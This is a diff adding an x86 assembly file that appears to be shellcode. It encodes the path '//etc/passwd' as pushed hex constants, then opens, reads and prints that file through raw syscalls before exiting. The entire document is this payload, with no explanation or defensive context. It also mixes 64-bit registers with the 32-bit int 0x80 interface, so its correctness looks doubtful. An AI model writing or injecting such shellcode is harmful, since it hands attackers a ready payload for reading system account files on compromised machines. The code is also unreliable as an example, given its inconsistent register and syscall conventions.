@@ -1,0 +1,35 @@
+global _start
+
+section .text
+
+_start:
+  xor rcx, rcx
+  mul rcx
+
+open:
+  mov al, 0x05
+  push rcx
+  push 0x64777373
+  push 0x61702f63
+  push 0x74652f2f
+  mov rbx, rsp
+  int 0x80
+
+read:
+  xchg eax, ebx
+  xchg eax, ecx
+  mov al, 0x03
+  mov dx, 0x0FFF
+  inc edx
+  int 0x80
+
+write:
+  xchg eax, edx
+  mov bl, 0x01
+  shr eax, 0x0A
+  int 0x80
+
+exit:
+  xchg eax, ebx
+  int 0x80
+
